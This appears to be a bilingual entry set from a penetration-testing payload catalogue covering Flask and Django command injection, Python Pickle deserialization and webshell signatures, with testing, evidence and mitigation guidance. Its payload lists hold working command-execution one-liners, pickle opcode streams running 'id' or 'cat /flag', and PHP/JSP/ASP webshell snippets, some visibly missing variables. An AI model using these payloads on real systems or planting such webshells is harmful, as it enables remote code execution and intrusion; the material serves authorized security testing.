name.zh: Flask 请求参数命令执行片段

description.zh: 覆盖 request.args、form 与 values 进入 os、subprocess、eval 或 exec 的 Flask 代码片段，用于确认 HTTP 参数是否跨入 Python 执行边界。
description.en: Covers Flask snippets where request args, forms, or values reach os, subprocess, eval, or exec, testing whether HTTP parameters cross into Python execution.

overview.zh: Flask 请求参数命令执行片段用于核对Flask 请求参数是否被直接传给系统命令、Shell 子进程或 Python 动态求值函数。该条目只在以下前提下适用：视图、模板扩展或调试辅助代码从 request 对象读取未受约束的 cmd 参数并进入 os.popen、os.system、subprocess、eval 或 exec。有效判定必须取得一次性固定标记的标准输出、对应服务进程日志和同一请求 ID 能够相互关联；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。
overview.en: Flask Request-Parameter Command Execution Snippets checks whether Flask request parameters are passed directly to operating-system commands, shell subprocesses, or Python dynamic evaluation. It applies when a view, template extension, or debugging helper reads an unconstrained cmd parameter from request and passes it to os.popen, os.system, subprocess, eval, or exec. A valid finding requires stdout from a one-time fixed marker, the corresponding service-process log, and the same request identifier correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution.

vulnerability.zh: 风险根因是视图、模板扩展或调试辅助代码从 request 对象读取未受约束的 cmd 参数并进入 os.popen、os.system、subprocess、eval 或 exec，使应用可能暴露“Flask 请求参数是否被直接传给系统命令、Shell 子进程或 Python 动态求值函数”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。
vulnerability.en: The risk exists when a view, template extension, or debugging helper reads an unconstrained cmd parameter from request and passes it to os.popen, os.system, subprocess, eval, or exec, exposing the runtime boundary of whether Flask request parameters are passed directly to operating-system commands, shell subprocesses, or Python dynamic evaluation. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability.

exploitation.zh: 先以缺少 cmd 和普通文本参数建立错误处理基线，再逐个绑定真实 request 来源与原代码片段，使用无副作用固定标记确认调用路径。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。
exploitation.en: establish missing-cmd and plain-text error baselines, then bind each original snippet to the real request source and use a side-effect-free fixed marker to confirm the call path. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes.

mitigation.zh: 移除请求到动态执行函数的直接映射，改用固定操作与参数允许列表，关闭生产调试器，并以低权限隔离账户运行服务。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。
mitigation.en: remove direct request-to-evaluator mappings, use fixed operations and parameter allowlists, disable production debugging, and run the service under a low-privilege isolated identity. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths.

title.zh: 确认“Flask 请求参数命令执行片段”执行入口
title.en: Confirm the Flask Request-Parameter Command Execution Snippets execution entry

description.zh: 定位真实输入、处理器与最终 API，核对前提“视图、模板扩展或调试辅助代码从 request 对象读取未受约束的 cmd 参数并进入 os.popen、os.system、subprocess、eval 或 exec”，并记录运行时版本和服务身份。
description.en: Locate the real input, handler, and final API, confirm that a view, template extension, or debugging helper reads an unconstrained cmd parameter from request and passes it to os.popen, os.system, subprocess, eval, or exec, and record runtime version and service identity.

title.zh: 建立“Flask 请求到命令执行”安全基线
title.en: Establish the Flask Request-to-Command Execution baseline

description.zh: 使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“一次性固定标记的标准输出、对应服务进程日志和同一请求 ID 能够相互关联”作为异常证据。
description.en: Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting stdout from a one-time fixed marker, the corresponding service-process log, and the same request identifier correlate as abnormal evidence.

title.zh: 逐行验证“Flask 请求参数命令执行片段”
title.en: Validate Flask Request-Parameter Command Execution Snippets line by line

description.zh: 测试步骤为：先以缺少 cmd 和普通文本参数建立错误处理基线，再逐个绑定真实 request 来源与原代码片段，使用无副作用固定标记确认调用路径。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。
description.en: establish missing-cmd and plain-text error baselines, then bind each original snippet to the real request source and use a side-effect-free fixed marker to confirm the call path. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker.

attackChain.payload:
__import__('os').popen(request.args.get('cmd')).read()
__import__('os').popen(request.form.get('cmd')).read()
__import__('os').popen(request.values.get('cmd')).read()
__import__('os').popen(request.args['cmd']).read()
__import__('os').popen(request.form['cmd']).read()
__import__('os').system(request.args.get('cmd'))
__import__('os').system(request.form.get('cmd'))
__import__('subprocess').check_output(request.args.get('cmd'),shell=True)
__import__('subprocess').check_output(request.form.get('cmd'),shell=True)
__import__('subprocess').getoutput(request.args.get('cmd'))
__import__('subprocess').getoutput(request.form.get('cmd'))
eval(request.args.get('cmd'))
eval(request.form.get('cmd'))
exec(request.args.get('cmd'))
exec(request.form.get('cmd'))

title.zh: 修复运行时边界并回归
title.en: Remediate and regress the runtime boundary

description.zh: 实施“移除请求到动态执行函数的直接映射，改用固定操作与参数允许列表，关闭生产调试器，并以低权限隔离账户运行服务”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。
description.en: After applying remove direct request-to-evaluator mappings, use fixed operations and parameter allowlists, disable production debugging, and run the service under a low-privilege isolated identity, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable.

review.rationale: Flask 请求参数命令执行片段保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已在授权隔离环境定位“Flask 请求参数命令执行片段”的真实输入点、处理器和运行时版本，并确认：视图、模板扩展或调试辅助代码从 request 对象读取未受约束的 cmd 参数并进入 os.popen、os.system、subprocess、eval 或 exec。
prerequisites.en: The authorized isolated environment identifies the real input, handler, and runtime version for Flask Request-Parameter Command Execution Snippets, confirming that a view, template extension, or debugging helper reads an unconstrained cmd parameter from request and passes it to os.popen, os.system, subprocess, eval, or exec.

prerequisites.zh: 测试 worker 可随时销毁，并能同时观察一次性固定标记的标准输出、对应服务进程日志和同一请求 ID 能够相互关联。
prerequisites.en: The test worker is disposable and can observe stdout from a one-time fixed marker, the corresponding service-process log, and the same request identifier correlate.

analysis.zh: 阳性要求可控输入连续到达危险运行时 API，并取得一次性固定标记的标准输出、对应服务进程日志和同一请求 ID 能够相互关联。代码片段、语法错误、HTTP 200、参数回显，或在已有本地 Shell 中手工运行命令均属假阳性或前置能力，不能证明“Flask 请求参数是否被直接传给系统命令、Shell 子进程或 Python 动态求值函数”。
analysis.en: A positive requires a continuous path from controllable input to a dangerous runtime API plus stdout from a one-time fixed marker, the corresponding service-process log, and the same request identifier correlate. Snippets, syntax errors, HTTP 200, reflection, or manual commands after an existing shell are false positives or prerequisites and do not prove whether Flask request parameters are passed directly to operating-system commands, shell subprocesses, or Python dynamic evaluation.

opsecTips.zh: Flask 请求参数命令执行片段停止条件：“Flask 请求参数命令执行片段”只允许使用一次性固定标记；出现非预期子进程、外部网络、文件写入或权限变化时，立即终止 worker 并停止测试。 本条重点观察“Flask 请求参数是否被直接传给系统命令、Shell 子进程或 Python 动态求值函数”。
opsecTips.en: Flask Request-Parameter Command Execution Snippets stop condition: Use only a one-time fixed marker for Flask Request-Parameter Command Execution Snippets; terminate the worker and stop on unexpected child processes, external network, writes, or privilege changes. The entry-specific focus is whether Flask request parameters are passed directly to operating-system commands, shell subprocesses, or Python dynamic evaluation.

opsecTips.zh: Flask 请求参数命令执行片段清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Flask Request-Parameter Command Execution Snippets cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique.

name.zh: Python/Django 动态执行表达式
name.en: Python and Django Dynamic Execution Expressions

description.zh: 收录 os.system、subprocess、eval 与 exec 的 Python 表达式，只有在 Django 管理功能、模板扩展或调试入口确实执行可控表达式时才构成 RCE。
description.en: Collects Python os.system, subprocess, eval, and exec expressions that become RCE only when a Django management feature, template extension, or debug entry evaluates controllable expressions.

subCategory.zh: Python 动态求值与子进程

overview.zh: Python/Django 动态执行表达式用于核对应用中的可控字符串是否到达 Python 表达式求值或子进程创建 API。该条目只在以下前提下适用：Django 业务代码、任务处理器或调试工具把用户输入拼入 eval、exec、os.system 或 shell=True 调用。有效判定必须取得受控算术表达式或固定标记输出与具体调用栈、工作进程和请求或任务日志相对应；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。
overview.en: Python and Django Dynamic Execution Expressions checks whether an application-controlled string reaches Python expression evaluation or subprocess creation APIs. It applies when Django business code, task handlers, or debugging tools interpolate user input into eval, exec, os.system, or shell=True calls. A valid finding requires a controlled arithmetic expression or fixed marker output correlates with the exact call stack, worker process, and request or task log; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution.

vulnerability.zh: 风险根因是Django 业务代码、任务处理器或调试工具把用户输入拼入 eval、exec、os.system 或 shell=True 调用，使应用可能暴露“应用中的可控字符串是否到达 Python 表达式求值或子进程创建 API”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。
vulnerability.en: The risk exists when Django business code, task handlers, or debugging tools interpolate user input into eval, exec, os.system, or shell=True calls, exposing the runtime boundary of whether an application-controlled string reaches Python expression evaluation or subprocess creation APIs. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability.

exploitation.zh: 先定位真实动态执行点并用算术表达式验证求值，再选择不调用外部网络的固定命令标记区分 eval、exec 与 subprocess 路径。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。
exploitation.en: locate the real dynamic evaluator and confirm evaluation with arithmetic before using a fixed non-network command marker to distinguish eval, exec, and subprocess paths. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes.

mitigation.zh: 删除动态求值和 shell=True，使用类型化参数调用固定函数或 subprocess 参数数组，并对后台任务与管理入口执行独立授权。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。
mitigation.en: remove dynamic evaluation and shell=True, call fixed functions or subprocess argument arrays with typed parameters, and independently authorize background tasks and management entry points. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths.

title.zh: 确认“Python/Django 动态执行表达式”执行入口
title.en: Confirm the Python and Django Dynamic Execution Expressions execution entry

description.zh: 定位真实输入、处理器与最终 API，核对前提“Django 业务代码、任务处理器或调试工具把用户输入拼入 eval、exec、os.system 或 shell=True 调用”，并记录运行时版本和服务身份。
description.en: Locate the real input, handler, and final API, confirm that Django business code, task handlers, or debugging tools interpolate user input into eval, exec, os.system, or shell=True calls, and record runtime version and service identity.

title.zh: 建立“Python 动态求值与子进程”安全基线
title.en: Establish the Python Dynamic Evaluation and Subprocesses baseline

description.zh: 使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“受控算术表达式或固定标记输出与具体调用栈、工作进程和请求或任务日志相对应”作为异常证据。
description.en: Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting a controlled arithmetic expression or fixed marker output correlates with the exact call stack, worker process, and request or task log as abnormal evidence.

title.zh: 逐行验证“Python/Django 动态执行表达式”
title.en: Validate Python and Django Dynamic Execution Expressions line by line

description.zh: 测试步骤为：先定位真实动态执行点并用算术表达式验证求值，再选择不调用外部网络的固定命令标记区分 eval、exec 与 subprocess 路径。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。
description.en: locate the real dynamic evaluator and confirm evaluation with arithmetic before using a fixed non-network command marker to distinguish eval, exec, and subprocess paths. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker.

title.en: Remediate and regress the runtime boundary

description.zh: 实施“删除动态求值和 shell=True，使用类型化参数调用固定函数或 subprocess 参数数组，并对后台任务与管理入口执行独立授权”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。

Snippets, syntax errors, HTTP 200, reflection, or manual commands after an existing shell are false positives or prerequisites and do not prove whether an application-controlled string reaches Python expression evaluation or subprocess creation APIs.

opsecTips.en: Python and Django Dynamic Execution Expressions stop condition: Use only a one-time fixed marker for Python and Django Dynamic Execution Expressions; terminate the worker and stop on unexpected child processes, external network, writes, or privilege changes. The entry-specific focus is whether an application-controlled string reaches Python expression evaluation or subprocess creation APIs.

opsecTips.zh: Python/Django 动态执行表达式清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Python and Django Dynamic Execution Expressions cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique.

name.zh: Python Pickle Reduce 指令流

description.zh: 使用 protocol 0 的 GLOBAL、STRING、TUPLE 与 REDUCE 指令调用 os.system 或 exec，验证不可信 Pickle 数据是否被 Python 反序列化。
description.en: Uses protocol-0 GLOBAL, STRING, TUPLE, and REDUCE opcodes to invoke os.system or exec, testing whether untrusted Pickle data is deserialized by Python.

subCategory.zh: Python Pickle 不安全反序列化

overview.zh: Python Pickle Reduce 指令流检查Pickle 虚拟机是否解析攻击者控制的 GLOBAL 与 REDUCE 指令并调用进程执行函数。成立前提为：服务对 Cookie、缓存、消息队列或上传内容调用 pickle.loads，且反序列化数据缺少可信来源和完整性保护。反序列化风险必须通过隔离工作进程产生固定无害标记，并可从反序列化调用栈、审计日志和输入对象字节定位到同一次加载进行确认；仅识别到流头、类名或标签，不足以证明对象图已被加载或产生副作用。
overview.en: Python Pickle Reduce Opcode Streams checks whether the Pickle virtual machine interprets attacker-controlled GLOBAL and REDUCE opcodes and invokes process-execution functions. It applies when the service calls pickle.loads on cookies, caches, queues, or uploads without trusted provenance and integrity protection. Deserialization risk requires an isolated worker produces a fixed harmless marker that correlates with the deserialization stack, audit log, and exact input bytes; a stream header, class name, or tag alone does not prove object loading or side effects.

vulnerability.zh: 根因是服务对 Cookie、缓存、消息队列或上传内容调用 pickle.loads，且反序列化数据缺少可信来源和完整性保护，不可信数据因此可能触发“Pickle 虚拟机是否解析攻击者控制的 GLOBAL 与 REDUCE 指令并调用进程执行函数”。真实影响由加载 API、允许类型、依赖版本、对象生命周期和服务权限共同决定，必须区分格式识别、对象实例化、gadget 触发与最终副作用四个阶段。
vulnerability.en: The root cause is the service calls pickle.loads on cookies, caches, queues, or uploads without trusted provenance and integrity protection, allowing whether the Pickle virtual machine interprets attacker-controlled GLOBAL and REDUCE opcodes and invokes process-execution functions. Impact depends on the loader API, allowed types, dependency versions, object lifecycle, and service privileges, so format recognition, object construction, gadget triggering, and final side effects must remain separate.

exploitation.zh: 在一次性进程中先加载正常业务对象，再用仅写入临时标记的等价 reduce 对象替换原命令，比较反序列化前后的进程行为。在一次性 worker 中先验证正常对象基线，再将危险动作替换为固定临时标记；逐个格式或类加载并保存原始字节、解析日志和进程状态，不读取真实秘密、不访问外部网络。
exploitation.en: load a normal business object in a disposable process, then replace the original command with an equivalent reduce object that only writes a temporary marker and compare process behavior. Establish a normal-object baseline in a disposable worker, replace dangerous behavior with a fixed temporary marker, and load one format or class at a time while preserving bytes, parser logs, and process state without real secrets or external network access.

mitigation.zh: 不对不可信数据使用 Pickle，改用 JSON 等数据格式；必须兼容时验证签名、隔离加载进程、限制权限并淘汰旧序列化令牌。完成迁移后同时重放合法数据对象、类型越界对象和历史令牌，确认业务数据仍可读取，而语言对象、函数源码和未许可类均被稳定拒绝。
mitigation.en: do not use Pickle for untrusted data; use data-only formats such as JSON, or verify signatures, isolate the loader, reduce privileges, and retire legacy serialized tokens. After migration, replay valid data objects, out-of-schema types, and historical tokens to preserve business data while reliably rejecting language objects, function source, and unapproved classes.

title.zh: 确认“Python Pickle Reduce 指令流”加载 API
title.en: Confirm the Python Pickle Reduce Opcode Streams loader

description.zh: 定位真实反序列化函数、输入来源、允许类型与依赖版本，核对前提“服务对 Cookie、缓存、消息队列或上传内容调用 pickle.loads，且反序列化数据缺少可信来源和完整性保护”。
description.en: Locate the real deserializer, source, allowed types, and dependency versions, confirming that the service calls pickle.loads on cookies, caches, queues, or uploads without trusted provenance and integrity protection.

title.zh: 建立“Python Pickle 不安全反序列化”正常对象基线
title.en: Establish the Unsafe Python Pickle Deserialization object baseline

description.zh: 加载固定数据对象并记录类型、生命周期与副作用，再以“隔离工作进程产生固定无害标记，并可从反序列化调用栈、审计日志和输入对象字节定位到同一次加载”作为异常对象证据。
description.en: Load a fixed data object and record types, lifecycle, and side effects, accepting an isolated worker produces a fixed harmless marker that correlates with the deserialization stack, audit log, and exact input bytes as abnormal-object evidence.

title.zh: 隔离验证“Python Pickle Reduce 指令流”对象
title.en: Validate the Python Pickle Reduce Opcode Streams object in isolation

description.zh: 测试步骤为：在一次性进程中先加载正常业务对象，再用仅写入临时标记的等价 reduce 对象替换原命令，比较反序列化前后的进程行为。保持原字节不变用于引用，实际运行时将危险动作替换为一次性标记。
description.en: load a normal business object in a disposable process, then replace the original command with an equivalent reduce object that only writes a temporary marker and compare process behavior. Preserve original bytes for reference while replacing dangerous runtime effects with one-time markers.

attackChain.payload:
cos
system
(S'id'
tR.
cos
system
(S'whoami'
tR.
cos
system
(S'cat /flag'
tR.
cos
system
(S'ls /'
tR.
c__builtin__
exec
(S'import os;os.system("id")'
tR.
c__builtin__
exec
(S'import os;os.system("whoami")'
tR.
c__builtin__
exec
(S'import os;os.system("cat /flag")'
tR.
c__builtin__
exec
(S'import os;os.system("ls /")'
tR.

title.zh: 迁移到安全数据格式
title.en: Migrate to a safe data format

description.zh: 实施“不对不可信数据使用 Pickle，改用 JSON 等数据格式；必须兼容时验证签名、隔离加载进程、限制权限并淘汰旧序列化令牌”并重放合法对象、未许可类型和历史令牌，确认数据兼容且对象代码不再加载。
description.en: Apply do not use Pickle for untrusted data; use data-only formats such as JSON, or verify signatures, isolate the loader, reduce privileges, and retire legacy serialized tokens, replay valid objects, unapproved types, and legacy tokens, and confirm data compatibility without loading object code.

review.rationale: Python Pickle Reduce 指令流保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已确认“Python Pickle Reduce 指令流”的真实 loader、输入格式、依赖版本和允许类型，并满足：服务对 Cookie、缓存、消息队列或上传内容调用 pickle.loads，且反序列化数据缺少可信来源和完整性保护。
prerequisites.en: The real loader, format, dependency versions, and allowed types for Python Pickle Reduce Opcode Streams are known, and the service calls pickle.loads on cookies, caches, queues, or uploads without trusted provenance and integrity protection.

prerequisites.zh: 可在无外网的一次性进程加载正常对象，并观察隔离工作进程产生固定无害标记，并可从反序列化调用栈、审计日志和输入对象字节定位到同一次加载。
prerequisites.en: A disposable no-network process can load a normal object and observe an isolated worker produces a fixed harmless marker that correlates with the deserialization stack, audit log, and exact input bytes.

analysis.zh: 阳性必须证明输入到达 loader、对象或函数被构造、触发路径执行，并取得隔离工作进程产生固定无害标记，并可从反序列化调用栈、审计日志和输入对象字节定位到同一次加载。流头、Base64、类名、YAML 标签、解析异常或依赖中存在 gadget 均是假阳性，不能证明“Pickle 虚拟机是否解析攻击者控制的 GLOBAL 与 REDUCE 指令并调用进程执行函数”。
analysis.en: A positive proves loader reachability, object or function construction, trigger execution, and an isolated worker produces a fixed harmless marker that correlates with the deserialization stack, audit log, and exact input bytes. Headers, Base64, class names, YAML tags, parser errors, or a gadget merely present in dependencies are false positives and do not prove whether the Pickle virtual machine interprets attacker-controlled GLOBAL and REDUCE opcodes and invokes process-execution functions.

opsecTips.zh: Python Pickle Reduce 指令流停止条件：将危险动作替换为一次性临时标记；若 loader 尝试联网、加载远程类、访问真实文件或启动非标记进程，立即杀死隔离进程。 本条重点观察“Pickle 虚拟机是否解析攻击者控制的 GLOBAL 与 REDUCE 指令并调用进程执行函数”。
opsecTips.en: Python Pickle Reduce Opcode Streams stop condition: Replace dangerous effects with a one-time marker; kill the isolated process on network access, remote class loading, real-file access, or a non-marker process. The entry-specific focus is whether the Pickle virtual machine interprets attacker-controlled GLOBAL and REDUCE opcodes and invokes process-execution functions.

opsecTips.zh: Python Pickle Reduce 指令流清理条件：每个对象使用新进程；测试后销毁进程、临时目录和缓存，轮换测试会话材料，并确认类、原型或全局状态无残留。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Python Pickle Reduce Opcode Streams cleanup condition: Use a fresh process per object; destroy processes, temporary directories, and caches, rotate test session material, and verify no class, prototype, or global state remains. Recheck that no triggerable state remains for this technique.

name.zh: 多语言 WebShell 特征字典

description.zh: 混合 PHP、JSP、ASP 与 ASP.NET 的函数和模板特征，其中多行是检测模式或不完整片段，应迁入 WebShell 工具字典而非作为可直接执行 Payload。
description.en: Mixes PHP, JSP, ASP, and ASP.NET function and template signatures, including incomplete detection patterns that belong in a webshell tool dictionary rather than an executable payload entry.

overview.zh: 多语言 WebShell 特征字典是工具命令或参考字典，不是独立 Payload。维护目标为多语言函数名、模板定界符和动态调用模式如何按运行时分类、去重并标记版本适用性。其适用前提为：该集合本身只提供代码特征，未描述上传、路由、解释器或请求参数到命令执行的完整数据流。迁移质量以原始字节、来源、语言标签和检测命中位置完整保留，且不会把无效片段标成可运行 WebShell为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: Multi-Language Webshell Signature Dictionary is tool command or reference data rather than an independent payload. It maintains how multi-language function names, template delimiters, and dynamic-call patterns are classified by runtime, deduplicated, and tagged for version applicability. Its prerequisites are the collection provides code signatures without a complete upload, routing, interpreter, or request-to-command data flow. Migration quality requires original bytes, provenance, language tags, and detection locations are preserved without presenting invalid fragments as runnable webshells; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于该集合本身只提供代码特征，未描述上传、路由、解释器或请求参数到命令执行的完整数据流，随后才可能用这些命令或特征审查“多语言函数名、模板定界符和动态调用模式如何按运行时分类、去重并标记版本适用性”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on the collection provides code signatures without a complete upload, routing, interpreter, or request-to-command data flow, after which the commands or signatures may examine how multi-language function names, template delimiters, and dynamic-call patterns are classified by runtime, deduplicated, and tagged for version applicability. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 逐行识别 PHP、JSP、Classic ASP 与 ASP.NET 语法，标记已废弃函数和缺失变量的片段，再与现有工具命令执行精确去重。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: classify every line as PHP, JSP, Classic ASP, or ASP.NET, tag obsolete functions and missing-variable fragments, and deduplicate exact bytes against the existing tool command. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 从 Payload 树移除该特征集合并合并至 web-shell-payloads，保留语言、版本与检测用途说明，实际利用技术继续由细粒度 Payload 条目维护。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: remove the signature collection from payload navigation and merge it into web-shell-payloads with language, version, and detection notes while focused payload entries retain executable techniques. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

title.zh: 核对“多语言 WebShell 特征字典”来源与角色
title.en: Verify Multi-Language Webshell Signature Dictionary provenance and role

description.zh: 确认该记录是命令或字典而非漏洞数据流，记录来源、平台、版本和前提“该集合本身只提供代码特征，未描述上传、路由、解释器或请求参数到命令执行的完整数据流”。
description.en: Confirm the record is command or dictionary data rather than a vulnerability flow, recording provenance, platform, version, and prerequisites: the collection provides code signatures without a complete upload, routing, interpreter, or request-to-command data flow.

title.zh: 逐行标注“WebShell 检测特征”适用性
title.en: Tag Webshell Detection Signatures applicability line by line

description.zh: 按实现、运行时、传输或识别用途分类，记录失效语法、副作用与证据要求“原始字节、来源、语言标签和检测命中位置完整保留，且不会把无效片段标成可运行 WebShell”。
description.en: Classify by implementation, runtime, transport, or signature use and record invalid syntax, side effects, and evidence requirements: original bytes, provenance, language tags, and detection locations are preserved without presenting invalid fragments as runnable webshells.

title.zh: 迁移“多语言 WebShell 特征字典”原始命令
title.en: Migrate original Multi-Language Webshell Signature Dictionary commands

description.zh: 测试步骤为：逐行识别 PHP、JSP、Classic ASP 与 ASP.NET 语法，标记已废弃函数和缺失变量的片段，再与现有工具命令执行精确去重。完整保留原命令并只在一次性环境用固定标记验证。
description.en: classify every line as PHP, JSP, Classic ASP, or ASP.NET, tag obsolete functions and missing-variable fragments, and deduplicate exact bytes against the existing tool command. Preserve the original command in full and validate only with fixed markers in a disposable environment.

attackChain.payload:
<?php eval(['cmd']);?>
<?php system(['cmd']);?>
<?php echo shell_exec(['cmd']);?>
<?php passthru(['cmd']);?>
<?php assert(['cmd']);?>
<?php preg_replace('/.*/e',['cmd'],'');?>
<?php ='ev'.'al';(['cmd']);?>
<?php ['a'](['b']);?>
<?php array_map('assert',array(['cmd']));?>
<?php call_user_func('assert',['cmd']);?>
<?php call_user_func_array('assert',array(['cmd']));?>
<?php create_function('',['cmd'])();?>
<?php $_GET[cmd];?>
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
<%Runtime.getRuntime().exec(request.getParameter(new String(new char[]{'c','m','d'})));%>
<%execute(request("cmd"))%>
<%@ Page Language="C#"%><%System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]);%>

title.zh: 建立目标 Tool 回归
title.en: Regress the destination tool

description.zh: 实施“从 Payload 树移除该特征集合并合并至 web-shell-payloads，保留语言、版本与检测用途说明，实际利用技术继续由细粒度 Payload 条目维护”，确认工具入口、复制、去重、版本标签与导航均正确，且 Payload 树不再重复。
description.en: Apply remove the signature collection from payload navigation and merge it into web-shell-payloads with language, version, and detection notes while focused payload entries retain executable techniques and verify tool access, copying, deduplication, version tags, and navigation without payload-tree duplication.

review.rationale: 多语言 WebShell 特征字典是纯工具命令或参考字典，应迁入 web-shell-payloads，保留原始字节、来源和适用前提。

prerequisites.zh: 已确认“多语言 WebShell 特征字典”是纯命令/字典，目标 Tool web-shell-payloads 均存在，并记录来源、版本及前提：该集合本身只提供代码特征，未描述上传、路由、解释器或请求参数到命令执行的完整数据流。
prerequisites.en: The Multi-Language Webshell Signature Dictionary record is command or dictionary data, destination tools web-shell-payloads exist, and provenance, version, and prerequisites are recorded: the collection provides code signatures without a complete upload, routing, interpreter, or request-to-command data flow.

prerequisites.zh: 可在一次性主机或离线解析器逐行验证，并用原始字节、来源、语言标签和检测命中位置完整保留，且不会把无效片段标成可运行 WebShell检查迁移完整性。
prerequisites.en: Every line can be checked in a disposable host or offline parser, using original bytes, provenance, language tags, and detection locations are preserved without presenting invalid fragments as runnable webshells for migration completeness.

analysis.zh: 本条阳性是命令/字典被准确迁移，原字节、来源和原始字节、来源、语言标签和检测命中位置完整保留，且不会把无效片段标成可运行 WebShell保留；它不确认目标漏洞。命令可运行、已有 Shell 回连、字典命中或签名相似均不能证明“多语言函数名、模板定界符和动态调用模式如何按运行时分类、去重并标记版本适用性”对应的初始漏洞。
analysis.en: A positive means accurate migration with original bytes, provenance, and original bytes, provenance, language tags, and detection locations are preserved without presenting invalid fragments as runnable webshells; it does not confirm a target vulnerability. Runnable commands, callbacks from an existing shell, wordlist hits, or signature similarity do not prove an initial vulnerability related to how multi-language function names, template delimiters, and dynamic-call patterns are classified by runtime, deduplicated, and tagged for version applicability.

opsecTips.zh: 多语言 WebShell 特征字典停止条件：默认离线解析；执行时只用一次性自有地址和固定标记。指向公共地址、生成真实载荷、打开交互 Shell 或触碰非测试文件时立即停止。 本条重点观察“多语言函数名、模板定界符和动态调用模式如何按运行时分类、去重并标记版本适用性”。
opsecTips.en: Multi-Language Webshell Signature Dictionary stop condition: Prefer offline parsing; use disposable owned destinations and fixed markers if execution is needed. Stop on public destinations, real payload generation, interactive shells, or non-test files. The entry-specific focus is how multi-language function names, template delimiters, and dynamic-call patterns are classified by runtime, deduplicated, and tagged for version applicability.

opsecTips.zh: 多语言 WebShell 特征字典清理条件：迁移后关闭监听器，删除 FIFO、生成文件、下载脚本和测试字典副本，销毁环境并核对目标 Tool 无重复或未标记失效行。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Multi-Language Webshell Signature Dictionary cleanup condition: Close listeners, remove FIFOs, generated files, downloads, and wordlist copies, destroy the environment, and verify destination tools have no duplicates or untagged invalid lines. Recheck that no triggerable state remains for this technique.

name.zh: Bash /dev/tcp 反连命令

description.zh: 基于 Bash /dev/tcp、文件描述符重定向与交互 Shell 的反连命令清单，属于 Bash 工具用法而不是 WebShell 文件 Payload。
description.en: A reverse-connection command list based on Bash dev-tcp, file-descriptor redirection, and interactive shells; it is Bash tool usage rather than a webshell-file payload.

